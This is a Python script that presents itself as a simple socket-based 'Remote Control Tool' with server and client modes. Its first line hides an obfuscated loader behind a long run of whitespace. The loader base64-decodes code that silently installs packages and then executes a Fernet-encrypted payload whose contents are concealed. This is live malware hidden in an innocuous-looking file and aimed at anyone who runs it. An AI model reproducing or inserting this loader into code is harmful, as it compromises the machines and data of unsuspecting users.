import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ0VhY1JwenZqSGFvbnZhZEtXdEpqZ1FnOHpPeVY2NTdHREdfOVMzZVFBZTQ9JykuZGVjcnlwdChiJ2dBQUFBQUJtYnJuUHZneU9GY0RWcG0wamtFZERzb0lpLS15RG41aUhFWjVWbXhtMzBwcGcxNkZ4Tmx6ZlFqQ3ZZUXNrLWRKcVZJSjF2SHloWEpSc1dTUldjSFJtaGY3YXZVYm9HZ2dubndfRUFWX3ZPY09QdHA2ZG9Eb0Z0cGxGeWQzaERZRWdORXhyZVhjOWpKY1lBYkNtc1VldWZTUW1mQml1Z3Vjd1RUWVhsVlpFU0Mxc0daSDhiU0dVZjMwREJPNExKczlHVnVWTmxVR0czUFd1c3l5MWJIVEpPRWh2ZzBiU2tSWVRsWVRWczlWb3o2RFB2MHc9Jykp').decode())
import socket
import sys
import time

class RemoteControlTool:
    def __init__(self):
        self.host = None
        self.port = 12345
        self.server_socket = None
        self.client_socket = None

    def start_server(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(1)
            print("Server started. Waiting for connection...")
        except OSError as e:
            print(f"Failed to start server: {e}")
            sys.exit(1)

    def accept_connection(self):
        try:
            self.client_socket, _ = self.server_socket.accept()
            print("Connection established.")
        except Exception as e:
            print(f"Failed to accept connection: {e}")

    def connect_to_client(self, host):
        self.host = host
        try:
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_socket.connect((self.host, self.port))
            print("Connected to client.")
        except ConnectionRefusedError:
            print("Failed to connect. Make sure the server is running and the IP address is correct.")
            sys.exit(1)
        except Exception as e:
            print(f"Failed to connect to client: {e}")
            sys.exit(1)

    def send_command(self, command):
        if self.client_socket:
            try:
                self.client_socket.send(command.encode())
                print(f"Command '{command}' sent.")
            except Exception as e:
                print(f"Failed to send command: {e}")

    def receive_output(self):
        if self.client_socket:
            try:
                output = self.client_socket.recv(1024).decode()
                print("Received output:")
                print(output)
            except Exception as e:
                print(f"Failed to receive output: {e}")

    def close_connection(self):
        if self.client_socket:
            try:
                self.client_socket.close()
                print("Connection closed.")
            except Exception as e:
                print(f"Failed to close connection: {e}")

def main():
    print("Welcome to the Remote Control Tool!")
    print("This tool allows you to remotely execute commands on a target machine.")
    print("")

    remote_tool = RemoteControlTool()

    choice = input("Please choose a mode:\n1. Server\n2. Client\n\nYour choice: ")
    print("")

    if choice == '1':
        print("You have chosen to run the Remote Control Tool as a server.")
        print("Starting the server...")
        remote_tool.start_server()
        print("Server started successfully. Waiting for incoming connection...")
        remote_tool.accept_connection()
        print("Connection established with the client.")
    elif choice == '2':
        print("You have chosen to run the Remote Control Tool as a client.")
        host = input("Please enter the IP address of the server to connect to: ")
        print("Connecting to the server...")
        remote_tool.connect_to_client(host)
        print("Connected to the server successfully.")
    else:
        print("Invalid choice. Exiting.")
        return

    print("")
    print("You are now connected to the target machine.")
    print("You can enter commands to execute on the target machine.")
    print("Type 'exit' to quit the Remote Control Tool.")

    while True:
        print("")
        command = input("Enter command: ")
        if command.lower() == 'exit':
            break

        remote_tool.send_command(command)
        remote_tool.receive_output()

    print("")
    print("Exiting the Remote Control Tool.")
    remote_tool.close_connection()

if __name__ == "__main__":
    main()
print('riqvbpje')